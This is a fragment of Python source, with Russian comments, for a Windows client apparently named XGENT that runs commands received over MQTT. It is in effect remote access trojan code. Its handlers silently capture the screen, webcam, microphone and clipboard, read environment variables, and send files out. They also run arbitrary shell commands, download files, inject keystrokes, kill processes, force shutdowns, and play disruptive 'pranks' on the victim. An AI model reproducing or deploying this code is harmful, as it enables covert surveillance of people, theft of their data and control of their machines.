        self._notify_text(payload.get("text", ""))

    def _notify_text(self, text: str) -> None:
        if not text:
            return
        threading.Thread(target=self._show_message_box, args=(text,), daemon=True).start()

    def _show_message_box(self, text: str) -> None:
        ctypes_windll_user32_message_box(text)

    def _do_sound(self, payload: dict) -> None:
        text = payload.get("text", "")
        if not text.strip() or text.strip().lower() == "beep":
            self._play_beep()
        else:
            self._speak(text)

    def _play_beep(self) -> None:
        winsound.MessageBeep(-1)

    def _speak(self, text: str) -> None:
        try:
            import pyttsx3

            engine = pyttsx3.init()
            engine.say(text)
            engine.runAndWait()
        except Exception:
            log.exception("pyttsx3 не сработал — использую системный сигнал")
            winsound.MessageBeep(-1)

    def _do_status_request(self, payload: dict) -> None:
        self._publish_status()

    def _do_screenshot(self, payload: dict) -> None:
        """Сделать скриншот и отправить base64 JPEG в MQTT."""
        try:
            from PIL import ImageGrab

            try:
                img = ImageGrab.grab(all_screens=True)
            except Exception:
                img = ImageGrab.grab()
            img.thumbnail((1600, 1200))
            buf = io.BytesIO()
            img.convert("RGB").save(buf, format="JPEG", quality=80, optimize=True)
            b64 = base64.b64encode(buf.getvalue()).decode("ascii")
            self._publish_response("screenshot", {
                "type": "screenshot",
                "device_id": DEVICE_ID,
                "image": b64,
            })
            log.info("Скриншот отправлен (%d байт)", len(buf.getvalue()))
        except Exception as exc:
            log.warning("Ошибка создания скриншота: %s", exc)
            self._publish_response("screenshot", {
                "type": "screenshot",
                "device_id": DEVICE_ID,
                "image": None,
                "error": str(exc),
            })

    def _do_geo_location(self, payload: dict) -> None:
        """Получить приблизительную геолокацию по IP."""
        import urllib.request
        try:
            req = urllib.request.Request("https://ipapi.co/json/", headers={'User-Agent': 'XIDER-Agent/3'})
            with urllib.request.urlopen(req, timeout=10) as response:
                data = json.loads(response.read().decode())
            if not data.get("error") and (data.get("ip") or data.get("city")):
                info = (f"📍 <b>Геолокация (по IP):</b>\n"
                        f"🌍 Страна: {data.get('country_name') or data.get('country')}\n"
                        f"🏙 Город: {data.get('city') or '?'}\n"
                        f"📡 Провайдер: {data.get('org') or '?'}\n"
                        f"🗺 Координаты: {data.get('latitude')}, {data.get('longitude')}\n"
                        f"💻 IP: {data.get('ip') or '?'}")
                ok = True
            else:
                info = "⚠️ Не удалось определить локацию."
                ok = False
        except Exception as exc:
            info = f"❌ Ошибка геолокации: {exc}"
            ok = False
            
        self._publish_response("geo_location", {
            "type": "geo_location",
            "device_id": DEVICE_ID,
            "ok": ok,
            "text": info,
        })
        self._publish_response("output", {
            "type": "geo_location",
            "device_id": DEVICE_ID,
            "ok": ok,
            "text": info,
        })

    def _do_webcam(self, payload: dict) -> None:
        """Сделать фото с веб-камеры и отправить base64 JPEG в MQTT."""
        import cv2

        cap = cv2.VideoCapture(0)
        try:
            if not cap.isOpened():
                log.error("Камера не найдена или нет доступа")
                self._publish_response("webcam", {
                    "type": "webcam", "device_id": DEVICE_ID, "image": None,
                })
                return
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
            for _ in range(15):
                cap.read()
            ret, frame = cap.read()
            if not ret:
                log.error("Не удалось получить кадр")
                self._publish_response("webcam", {
                    "type": "webcam", "device_id": DEVICE_ID, "image": None,
                })
                return
            _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
            b64 = base64.b64encode(buffer).decode("ascii")
            self._publish_response("webcam", {
                "type": "webcam",
                "device_id": DEVICE_ID,
                "image": b64,
            })
            log.info("Снимок вебки отправлен (%d байт)", len(buffer))
        finally:
            cap.release()

    def _do_sysinfo(self, payload: dict) -> None:
        """Собрать расширенную информацию о системе и отправить в MQTT."""
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("C:\\")
        boot = psutil.boot_time()
        uptime_sec = int(time.time() - boot)
        hours, remainder = divmod(uptime_sec, 3600)
        minutes, _ = divmod(remainder, 60)
        uptime_str = f"{hours}ч {minutes}мин"
        battery = _format_battery(psutil.sensors_battery())

        self._publish_response("sysinfo", {
            "type": "sysinfo",
            "device_id": DEVICE_ID,
            "hostname": socket.gethostname(),
            "mac": _primary_mac(),
            "os": PLATFORM,
            "cpu_percent": round(cpu, 1),
            "ram_used_gb": round(mem.used / (1024 ** 3), 1),
            "ram_total_gb": round(mem.total / (1024 ** 3), 1),
            "ram_percent": round(mem.percent, 1),
            "disk_used_gb": round(disk.used / (1024 ** 3), 1),
            "disk_total_gb": round(disk.total / (1024 ** 3), 1),
            "disk_percent": round(disk.percent, 1),
            "boot_time_sec": int(boot),
            "uptime": uptime_str,
            "battery": battery,
        })
        log.info("Sysinfo отправлен")

    def _do_processes(self, payload: dict) -> None:
        """Топ-5 процессов по памяти (совместимо с ботом)."""
        procs = list(psutil.process_iter(["pid", "name", "memory_percent"]))
        top_n = int(payload.get("top_n", 5) or 5)
        top_n = max(1, min(top_n, 25))
        result = _format_processes(procs, top_n=top_n)
        self._publish_response("processes", {
            "type": "processes",
            "device_id": DEVICE_ID,
            "lines": result["lines"],
            "top": result["top"],
        })
        log.info("Список процессов отправлен")

    def _do_battery(self, payload: dict) -> None:
        """Состояние батареи/питания (для ноутбуков)."""
        battery = _format_battery(psutil.sensors_battery())
        self._publish_response("battery", {
            "type": "battery",
            "device_id": DEVICE_ID,
            **battery,
        })
        log.info("Состояние батареи отправлено")

    def _do_network(self, payload: dict) -> None:
        """Сводка по сетевым интерфейсам и трафику."""
        result = _format_network(
            psutil.net_if_addrs(),
            psutil.net_if_stats(),
            psutil.net_io_counters(pernic=True),
        )
        self._publish_response("network", {
            "type": "network",
            "device_id": DEVICE_ID,
            "interfaces": result["interfaces"],
            "totals": result["totals"],
        })
        log.info("Сетевая сводка отправлена")

    def _do_services(self, payload: dict) -> None:
        """Сводка по службам Windows (только чтение)."""
        result = _format_services(psutil.win_service_iter())
        self._publish_response("services", {
            "type": "services",
            "device_id": DEVICE_ID,
            "total": result["total"],
            "running": result["running"],
            "stopped": result["stopped"],
            "failed_auto_start": result["failed_auto_start"],
        })
        log.info("Сводка служб отправлена")

    def _do_capabilities(self, payload: dict) -> None:
        """Сообщить серверу, какие возможности поддерживает этот клиент.

        НЕ содержит секретов (SHARED_KEY намеренно исключён).
        """
        self._publish_response("capabilities", {
            "type": "capabilities",
            "device_id": DEVICE_ID,
            "platform": PLATFORM,
            "version": VERSION,
            "hostname": socket.gethostname(),
            "commands": sorted(SUPPORTED_COMMANDS),
            "features": _detect_features(),
        })
        log.info("Отчёт о возможностях отправлен")

    def _do_clipboard(self, payload: dict) -> None:
        """Чтение буфера обмена (без записи)."""
        import pyperclip

        text = pyperclip.paste() or ""
        self._publish_response("clipboard", {
            "type": "clipboard",
            "device_id": DEVICE_ID,
            "text": text,
        })
        log.info("Буфер обмена отправлен (%d символов)", len(text))

    def _do_clipboard_set(self, payload: dict) -> None:
        """Записать текст в буфер обмена."""
        import pyperclip

        text = str(payload.get("text", ""))
        pyperclip.copy(text)
        self._publish_response("clipboard_set", {
            "type": "clipboard_set",
            "device_id": DEVICE_ID,
            "length": len(text),
        })
        log.info("В буфер обмена записано %d символов", len(text))

    def _do_kill_process(self, payload: dict) -> None:
        """Завершить процесс по PID (terminate, затем kill)."""
        pid = int(payload.get("pid", 0) or 0)
        proc = psutil.Process(pid)
        name = proc.name()
        log.info("kill_process: pid=%s (%s)", pid, name)
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except psutil.TimeoutExpired:
            proc.kill()
        self._publish_response("kill_process", {
            "type": "kill_process",
            "device_id": DEVICE_ID,
            "pid": pid,
            "name": name,
            "killed": True,
        })

    def _do_disks(self, payload: dict) -> None:
        """Список дисков с размерами."""
        disks = _format_disks(psutil.disk_partitions())
        self._publish_response("disks", {
            "type": "disks",
            "device_id": DEVICE_ID,
            "disks": disks,
            "lines": [
                f"{d['device']} {d['free_gb']}/{d['total_gb']} ГБ свободно ({d['percent']}%)"
                for d in disks
            ],
        })
        log.info("Список дисков отправлен")

        log.info("Список дисков отправлен")

    # ---------------------------------------------------------------
    #  Новые команды волны 1: файлы, система, приколы
    # ---------------------------------------------------------------

    def _do_dir_list(self, payload: dict) -> None:
        path = (payload.get("path") or "~").strip()
        result = _list_directory(path)
        self._publish_response("dir_list", {"type": "dir_list", "device_id": DEVICE_ID, **result})
        log.info("dir_list: %s (найдено %s)", result.get("path"), result.get("total"))

    def _do_file_get(self, payload: dict) -> None:
        path = (payload.get("path") or "").strip()
        if not path:
            return
        try:
            max_bytes = 45_000_000
            size = os.path.getsize(path)
            if size > max_bytes:
                self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID,
                                                    "ok": False, "error": f"файл {size} байт > лимит"})
                return
            with open(path, "rb") as fh:
                b64 = base64.b64encode(fh.read()).decode("ascii")
            self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID,
                                                "ok": True, "path": path, "b64": b64,
                                                "name": os.path.basename(path),
                                                # Canonical schema; aliases keep older bots compatible.
                                                "data": b64, "filename": os.path.basename(path)})
            log.info("file_get: %s (%d байт)", path, size)
        except OSError as exc:
            self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID,
                                                "ok": False, "error": str(exc)})

    def _do_file_put(self, payload: dict) -> None:
        name = os.path.basename(payload.get("name") or "file.bin")
        data = payload.get("b64") or ""
        if not data:
            return
        raw_path = (payload.get("path") or "").strip()
        if raw_path:
            target = os.path.expanduser(os.path.expandvars(raw_path))
            base = os.path.dirname(target) or "."
        else:
            target_dir = (payload.get("dir") or "~").strip()
            base = os.path.expanduser(os.path.expandvars(target_dir))
            target = os.path.join(base, name)
        os.makedirs(base, exist_ok=True)
        try:
            with open(target, "wb") as fh:
                fh.write(base64.b64decode(data))
            self._publish_response("file_put", {"type": "file_put", "device_id": DEVICE_ID,
                                                "ok": True, "path": target})
            log.info("file_put: %s", target)
        except OSError as exc:
            self._publish_response("file_put", {"type": "file_put", "device_id": DEVICE_ID,
                                                "ok": False, "error": str(exc)})

    def _do_file_del(self, payload: dict) -> None:
        path = (payload.get("path") or "").strip()
        if not path:
            return
        try:
            os.remove(os.path.expanduser(os.path.expandvars(path)))
            ok, err = True, None
        except OSError as exc:
            ok, err = False, str(exc)
        self._publish_response("file_del", {"type": "file_del", "device_id": DEVICE_ID,
                                            "ok": ok, "path": path, "error": err})

    def _do_find_file(self, payload: dict) -> None:
        pattern = (payload.get("pattern") or "").strip()
        root = (payload.get("root") or "~").strip()
        result = _find_matches(pattern, root) if pattern else {"ok": False, "matches": [], "total": 0}
        self._publish_response("find_file", {"type": "find_file", "device_id": DEVICE_ID, **result})

    def _do_path_open(self, payload: dict) -> None:
        path = (payload.get("path") or "").strip()
        if not path:
            return
        try:
            os.startfile(os.path.expanduser(path))  # type: ignore[attr-defined]
            ok, err = True, None
        except (OSError, AttributeError) as exc:
            ok, err = False, str(exc)
        self._publish_response("path_open", {"type": "path_open", "device_id": DEVICE_ID,
                                             "ok": ok, "path": path, "error": err})

    def _do_ext_ip(self, payload: dict) -> None:
        import urllib.request
        try:
            with urllib.request.urlopen("https://api.ipify.org", timeout=6) as resp:
                ip = resp.read().decode("ascii", "ignore").strip()[:64]
        except Exception as exc:
            ip = f"error: {exc}"
        self._publish_response("ext_ip", {"type": "ext_ip", "device_id": DEVICE_ID, "ip": ip, "text": f"🌍 Внешний IP: {ip}"})

    def _do_screen_off(self, payload: dict) -> None:
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        log.info("Монитор выключен")

    def _do_screensaver_on(self, payload: dict) -> None:
        ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF140, 0)
        log.info("Screensaver запущен")

    def _get_master_volume(self):
        """Универсальное получение интерфейса IAudioEndpointVolume (поддержка pycaw всех версий)."""
        from comtypes import CLSCTX_ALL
        from ctypes import cast, POINTER
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        speakers = AudioUtilities.GetSpeakers()
        if hasattr(speakers, "EndpointVolume"):
            return speakers.EndpointVolume
        dev = getattr(speakers, "_dev", speakers)
        interface = dev.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        return cast(interface, POINTER(IAudioEndpointVolume))

    def _do_volume_set(self, payload: dict) -> None:
        """Установить общую громкость 0-100 (pycaw)."""
        level = max(0, min(100, int(payload.get("level", 50) or 50)))
        try:
            volume = self._get_master_volume()
            volume.SetMasterVolumeLevelScalar(level / 100.0, None)
            current = round(float(volume.GetMasterVolumeLevelScalar()) * 100)
            text = f"🎚 Громкость установлена: {current}%"
            ok = True
        except Exception as exc:
            log.warning("Ошибка установки громкости: %s", exc)
            current = level
            text = f"⚠️ Ошибка изменения громкости: {exc}"
            ok = False

        self._publish_response("volume_set", {
            "type": "volume_set",
            "device_id": DEVICE_ID,
            "ok": ok,
            "level": level,
            "current": current,
            "text": text,
        })
        self._publish_response("output", {
            "type": "volume_set",
            "device_id": DEVICE_ID,
            "ok": ok,
            "text": text,
        })
        log.info("Громкость: %s", text)

    def _do_mic(self, payload: dict) -> None:
        """Запись 5 секунд с микрофона по умолчанию, base64 ogg в MQTT."""
        import sounddevice as sd
        import soundfile as sf

        duration = int(payload.get("duration", 5))
        if duration <= 0 or duration > 60:
            duration = 5
        fs = 44100
        log.info("Запись микрофона %d сек @ %d Гц", duration, fs)
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait()
        with tempfile.NamedTemporaryFile(suffix=".ogg", delete=False) as tmp:
            tmp_path = tmp.name
        try:
            sf.write(tmp_path, recording, fs)
            with open(tmp_path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode("ascii")
        finally:
            os.unlink(tmp_path)
        self._publish_response("mic", {
            "type": "mic",
            "device_id": DEVICE_ID,
            "audio": b64,
        })
        log.info("Аудиозапись отправлена")

    def _do_shell(self, payload: dict) -> None:
        """Выполнить shell-команду и вернуть вывод (лимит 20 сек)."""
        cmd = (payload.get("command") or "").strip()
        if not cmd:
            return
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=20
            )
            output = (result.stdout or "") + (result.stderr or "")
            code = result.returncode
        except subprocess.TimeoutExpired:
            output = "TIMEOUT: команда выполнялась дольше 20 сек"
            code = -1
        except Exception as exc:
            output = f"ERROR: {exc}"
            code = -2
        self._publish_response("shell", {
            "type": "shell", "device_id": DEVICE_ID,
            "command": cmd, "output": output[:6000], "returncode": code,
        })
        log.info("Shell выполнен (rc=%s): %s", code, cmd[:80])

    def _do_hotkey(self, payload: dict) -> None:
        spec = (payload.get("keys") or "").strip()
        try:
            vks = map_hotkeys(spec)
        except ValueError as exc:
            self._publish_response("hotkey", {"type": "hotkey", "device_id": DEVICE_ID,
                                              "ok": False, "error": str(exc)})
            return
        KEYEVENTF_KEYUP = 0x0002

        def _press():
            for vk in vks:
                ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
            for vk in reversed(vks):
                ctypes.windll.user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
        threading.Thread(target=_press, name="xgent-hotkey", daemon=True).start()
        self._publish_response("hotkey", {"type": "hotkey", "device_id": DEVICE_ID,
                                          "ok": True, "keys": spec})

    def _do_proc_kill_name(self, payload: dict) -> None:
        result = _kill_by_name(payload.get("name") or "")
        log.info("proc_kill_name: %s", result)
        self._publish_response("proc_kill_name", {"type": "proc_kill_name",
                                                  "device_id": DEVICE_ID, **result})

    def _do_wifi_info(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"],
                text=True, stderr=subprocess.DEVNULL, timeout=10,
            )
            parsed = _parse_wifi_output(out)
            text = f"📶 Wi-Fi: {parsed['ssid'] or '—'} (сигнал: {parsed['signal'] or '—'})"
        except Exception as exc:
            parsed, text = {}, f"⚠️ Wi-Fi недоступен: {exc}"
        self._publish_response("wifi_info", {"type": "wifi_info", "device_id": DEVICE_ID,
                                             "ok": bool(parsed), "text": text, **parsed})

    def _do_usb_devices(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(
                ["powershell", "-NoProfile", "-Command",
                 "Get-PnpDevice -PresentOnly -Class USB | "
                 "Select-Object -First 25 -ExpandProperty FriendlyName"],
                text=True, stderr=subprocess.DEVNULL, timeout=20,
            )
            items = [ln.strip() for ln in out.splitlines() if ln.strip()]
            text = "🔌 USB:\n" + "\n".join(f"• {i}" for i in items[:25])
            ok = True
        except Exception as exc:
            items, text, ok = [], f"⚠️ USB: {exc}", False
        self._publish_response("usb_devices", {"type": "usb_devices", "device_id": DEVICE_ID,
                                               "ok": ok, "text": text, "items": items})

    def _do_startup_list(self, payload: dict) -> None:
        names = []
        try:
            for hive in ("HKCU", "HKLM"):
                out = subprocess.check_output(
                    ["reg", "query",
                     f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
                    text=True, stderr=subprocess.DEVNULL, timeout=10,
                )
                names.extend(_parse_reg_query(out))
            text = "🚀 Автозагрузка:\n" + ("\n".join(f"• {n}" for n in names[:30]) or "(пусто)")
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ Автозагрузка: {exc}", False
        self._publish_response("startup_list", {"type": "startup_list", "device_id": DEVICE_ID,
                                                "ok": ok, "text": text, "items": names})

    def _do_env_get(self, payload: dict) -> None:
        raw = payload.get("names") or payload.get("name")
        names = [raw] if isinstance(raw, str) else (raw or None)
        env = _collect_env(names)
        text = "\n".join(f"{k}={v}" for k, v in sorted(env.items())) or "(пусто)"
        self._publish_response("env_get", {"type": "env_get", "device_id": DEVICE_ID,
                                           "ok": True, "text": text[:3500], "env": env})

    def _do_netstat(self, payload: dict) -> None:
        try:
            out = subprocess.check_output(
                ["netstat", "-an", "-p", "tcp"],
                text=True, stderr=subprocess.DEVNULL, timeout=15,
            )
            lines = [ln for ln in out.splitlines() if ln.strip()][:40]
            text = "🕸 TCP-соединения (первые 40):\n" + "\n".join(lines)
            ok = True
        except Exception as exc:
            text, ok = f"⚠️ netstat: {exc}", False
        self._publish_response("netstat", {"type": "netstat", "device_id": DEVICE_ID,
                                           "ok": ok, "text": text[:3500]})

    def _do_download_url(self, payload: dict) -> None:
        url = (payload.get("url") or "").strip()
        dest = (payload.get("dest") or "").strip() or os.path.join(
            os.path.expanduser("~"), "Downloads", os.path.basename(url.split("?")[0]) or "xgent_download.bin"
        )
        try:
            result = subprocess.run(
                ["curl", "-L", "--max-time", "120", "-o", dest, url],
                capture_output=True, text=True, timeout=130,
            )
            ok = result.returncode == 0 and os.path.exists(dest)
            size = os.path.getsize(dest) if ok else 0
            text = f"⬇️ Скачано {size} байт → {dest}" if ok else f"⚠️ curl rc={result.returncode}"
        except Exception as exc:
            ok, size, text = False, 0, f"⚠️ {exc}"
        self._publish_response("download_url", {"type": "download_url", "device_id": DEVICE_ID,
                                                "ok": ok, "path": dest, "size": size, "text": text})

    def _do_wallpaper_set(self, payload: dict) -> None:
        """Установка обоев: по URL, из загруженного фото (b64) или случайного мема из сети."""
        url = (payload.get("url") or "").strip()
        b64 = (payload.get("b64") or "").strip()
        random_meme = payload.get("random_meme", False)

        # Автоматический бэкап текущих обоев перед заменой
        try:
            bf_path = CONFIG_DIR / "backup_wallpaper.txt"
            if not bf_path.exists():
                cur_buf = ctypes.create_unicode_buffer(512)
                ctypes.windll.user32.SystemParametersInfoW(0x0073, 512, cur_buf, 0)
                if cur_buf.value and os.path.exists(cur_buf.value):
                    bf_path.write_text(cur_buf.value, encoding="utf-8")
        except Exception as e:
            log.warning("Не удалось сохранить бэкап обоев: %s", e)

        img_path = os.path.join(tempfile.gettempdir(), "xgent_wallpaper.jpg")
        ok, err = False, None
        MEME_URLS = [
            "https://i.imgflip.com/4/30b1gx.jpg",
            "https://i.imgflip.com/4/1g8my4.jpg",
            "https://i.imgflip.com/4/1bij.jpg",
            "https://i.imgflip.com/4/26am.jpg",
            "https://i.imgflip.com/4/1ur9b0.jpg",
            "https://cataas.com/cat?width=1920&height=1080",
            "https://picsum.photos/1920/1080",
        ]

        try:
            import urllib.request
            if b64:
                raw_bytes = base64.b64decode(b64)
                with open(img_path, "wb") as f:
                    f.write(raw_bytes)
                ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, img_path, 0x3)
                ok = True
                log.info("Обои установлены из переданного фото (размер %d байт)", len(raw_bytes))
            elif random_meme or not url:
                target_url = random.choice(MEME_URLS)
                req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=12) as resp, open(img_path, "wb") as out:
                    out.write(resp.read())
                ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, img_path, 0x3)
                ok = True
                log.info("Обои установлены из случайного мема: %s", target_url)
            else:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=12) as resp, open(img_path, "wb") as out:
                    out.write(resp.read())
                ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, img_path, 0x3)
                ok = True
                log.info("Обои установлены по URL: %s", url)
        except Exception as exc:
            ok, err = False, str(exc)

        self._publish_response("wallpaper_set", {"type": "wallpaper_set", "device_id": DEVICE_ID,
                                                 "ok": ok, "error": err})
        text = "🖼 Обои успешно обновлены на рабочем столе!" if ok else f"⚠️ Ошибка установки обоев: {err}"
        self._publish_response("output", {"type": "wallpaper_set", "device_id": DEVICE_ID,
                                         "ok": ok, "text": text})

    def _do_msgbox_spam(self, payload: dict) -> None:
        text = (payload.get("text") or "Привет от XGENT! :)")[:200]
        count = max(1, min(10, int(payload.get("count", 3) or 3)))

        def _spam():
            for _ in range(count):
                ctypes.windll.user32.MessageBoxW(None, text, "XGENT", 0x40)
        threading.Thread(target=_spam, name="xgent-msgbox", daemon=True).start()
        self._publish_response("msgbox_spam", {"type": "msgbox_spam", "device_id": DEVICE_ID,
                                               "ok": True, "count": count})

    def _do_type_text(self, payload: dict) -> None:
        """Напечатать текст на удалённой машине (SendInput Unicode)."""
        text = (payload.get("text") or "")[:500]
        KEYEVENTF_UNICODE = 0x0004
        INPUT_KEYBOARD = 1

        class KEYBDINPUT(ctypes.Structure):
            _fields_ = [("wVk", ctypes.c_ushort), ("wScan", ctypes.c_ushort),
                        ("dwFlags", ctypes.c_ulong), ("time", ctypes.c_ulong),
                        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]

        class UNION(ctypes.Union):
            _fields_ = [("ki", KEYBDINPUT), ("padding", ctypes.c_ubyte * 32)]

        class INPUT(ctypes.Structure):
            _anonymous_ = ("u",)
            _fields_ = [("type", ctypes.c_ulong), ("u", UNION)]

        def _send_char(ch: str) -> None:
            inp = INPUT(type=INPUT_KEYBOARD)
            inp.u.ki = KEYBDINPUT(0, ord(ch), KEYEVENTF_UNICODE, 0, None)
            arr = (INPUT * 1)(inp)
            ctypes.windll.user32.SendInput(1, arr, ctypes.sizeof(INPUT))

        def _typer():
            for ch in text:
                _send_char(ch)
                time.sleep(0.01)
        threading.Thread(target=_typer, name="xgent-typer", daemon=True).start()
        self._publish_response("type_text", {"type": "type_text", "device_id": DEVICE_ID,
                                             "ok": True, "len": len(text)})


    def _do_open_app(self, payload: dict) -> None:
        """Запустить программу или открыть файл. Не использует `shell=True`."""
        app = (payload.get("app") or "").strip()
        if not app:
            log.warning("Команда open_app без имени")
            return
        log.info("open_app: %r", app)
        # Попробовать сначала через os.startfile (без shell), иначе — напрямую.
        try:
            os.startfile(app)  # type: ignore[attr-defined]
        except (AttributeError, FileNotFoundError, OSError):
            subprocess.Popen(app, shell=False)

    def _do_lock_screen(self, payload: dict) -> None:
        """Заблокировать экран Windows."""
        ctypes.windll.user32.LockWorkStation()
        log.info("Экран заблокирован")

    def _do_volume_toggle(self, payload: dict) -> None:
        """Mute/Unmute системного звука Windows через pycaw."""
        try:
            volume = self._get_master_volume()
            current_mute = volume.GetMute()
            volume.SetMute(not current_mute, None)
            new_mute = bool(volume.GetMute())
            state = "muted" if new_mute else "unmuted"
            text = "🔇 Звук выключен (MUTE)" if new_mute else "🔊 Звук включен (UNMUTE)"
            ok = True
            log.info("Звук: %s", state)
        except Exception as exc:
            ok, text = False, f"⚠️ Ошибка переключения звука: {exc}"
            new_mute = False
            log.error("volume_toggle error: %s", exc)

        self._publish_response("volume_toggle", {
            "type": "volume_toggle",
            "device_id": DEVICE_ID,
            "ok": ok,
            "muted": new_mute,
            "text": text,
        })
        self._publish_response("output", {
            "type": "volume_toggle",
            "device_id": DEVICE_ID,
            "ok": ok,
            "text": text,
        })

    def _do_power(self, payload: dict) -> None:
        """Выключить, перезагрузить или отправить машину в сон."""
        action = payload.get("power_action") or payload.get("action", "")
        if action == "shutdown":
            log.info("Выключение машины…")
            text = "⚡ Выключение ПК инициировано (через 3 сек)..."
            self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": "shutdown", "ok": True})
            self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": True, "text": text})
            subprocess.Popen(["shutdown.exe", "/s", "/f", "/t", "3", "/c", "XGENT: Выключение"])
        elif action == "reboot":
            log.info("Перезагрузка машины…")
            text = "🔄 Перезагрузка ПК инициирована (через 3 сек)..."
            self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": "reboot", "ok": True})
            self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": True, "text": text})
            subprocess.Popen(["shutdown.exe", "/r", "/f", "/t", "3", "/c", "XGENT: Перезагрузка"])
        elif action == "sleep":
            log.info("Устройство уходит в сон…")
            text = "😴 ПК переводится в спящий режим..."
            self._publish_response("power", {"type": "power", "device_id": DEVICE_ID, "action": "sleep", "ok": True})
            self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": True, "text": text})
            def _sleep():
                time.sleep(1.0)
                try:
                    ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
                except Exception as exc:
                    log.warning("SetSuspendState ctypes failed: %s, fallback to powershell", exc)
                    subprocess.run(["powershell", "-Command", "Add-Type -Assembly System.Windows.Forms; [System.Windows.Forms.Application]::SetSuspendState([System.Windows.Forms.PowerState]::Suspend, $false, $false)"], shell=True)
            threading.Thread(target=_sleep, daemon=True).start()
        else:
            log.warning("Неизвестное действие power: %s", action)
            text = f"⚠️ Неизвестное действие power: {action}"
            self._publish_response("output", {"type": "power", "device_id": DEVICE_ID, "ok": False, "text": text})

    def _do_stop(self, payload: dict) -> None:
        log.info("Получена команда остановки")
        self.request_stop()

    def _do_prank_screamer(self, payload: dict) -> None:
        def _run():
            try:
                vol = self._get_master_volume()
                vol.SetMasterVolumeLevelScalar(1.0, None)
                vol.SetMute(False, None)
            except Exception:
                pass
            webbrowser.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            for _ in range(5):
                try:
                    winsound.Beep(2500, 400)
                except Exception:
                    pass
        threading.Thread(target=_run, name="xgent-screamer", daemon=True).start()
        self._publish_response("prank_screamer", {"type": "prank_screamer", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_rickroll(self, payload: dict) -> None:
        tabs = min(int(payload.get("tabs", 10) or 10), 50)
        url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        def _run():
            for _ in range(tabs):
                webbrowser.open_new_tab(url)
                time.sleep(0.08)
        threading.Thread(target=_run, name="xgent-rickroll", daemon=True).start()
        self._publish_response("prank_rickroll", {"type": "prank_rickroll", "device_id": DEVICE_ID, "ok": True, "tabs": tabs})

    def _do_prank_matrix(self, payload: dict) -> None:
        cmd = 'start cmd /k "color 0a && title MATRIX && mode con: cols=120 lines=40 && @echo off && :loop && echo %random% %random% %random% %random% %random% %random% %random% %random% %random% && goto loop"'
        subprocess.Popen(cmd, shell=True)
        self._publish_response("prank_matrix", {"type": "prank_matrix", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_siren(self, payload: dict) -> None:
        duration = min(int(payload.get("duration", 10) or 10), 30)
        def _run():
            deadline = time.time() + duration
            while time.time() < deadline:
                try:
                    winsound.Beep(1200, 200)
                    winsound.Beep(700, 200)
                except Exception:
                    time.sleep(0.4)
        threading.Thread(target=_run, name="xgent-siren", daemon=True).start()
        self._publish_response("prank_siren", {"type": "prank_siren", "device_id": DEVICE_ID, "ok": True, "duration": duration})

    def _do_prank_shout_tts(self, payload: dict) -> None:
        text = str(payload.get("text") or "ВНИМАНИЕ! КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ!")[:300]
        def _run():
            try:
                import pyttsx3
                engine = pyttsx3.init()
                engine.setProperty('volume', 1.0)
                engine.say(text)
                engine.runAndWait()
            except Exception as e:
                log.warning("TTS failed: %s", e)
        threading.Thread(target=_run, name="xgent-shout", daemon=True).start()
        self._publish_response("prank_shout_tts", {"type": "prank_shout_tts", "device_id": DEVICE_ID, "ok": True})

    def _do_prank_swap_mouse(self, payload: dict) -> None:
        swap = bool(payload.get("swap", True))
        try:
            ctypes.windll.user32.SwapMouseButton(1 if swap else 0)
            ok = True
        except Exception:
            ok = False
        self._publish_response("prank_swap_mouse", {"type": "prank_swap_mouse", "device_id": DEVICE_ID, "ok": ok, "swap": swap})

    def _do_prank_crazy_cursor(self, payload: dict) -> None:
        duration = min(int(payload.get("duration", 10) or 10), 30)
        def _run():
            import math
            center_x, center_y = 800, 500
            angle = 0.0
            deadline = time.time() + duration
            while time.time() < deadline:
                x = center_x + int(250 * math.cos(angle))
                y = center_y + int(250 * math.sin(angle))
                ctypes.windll.user32.SetCursorPos(x, y)
                angle += 0.25
                time.sleep(0.02)
        threading.Thread(target=_run, name="xgent-crazycursor", daemon=True).start()
        self._publish_response("prank_crazy_cursor", {"type": "prank_crazy_cursor", "device_id": DEVICE_ID, "ok": True, "duration": duration})

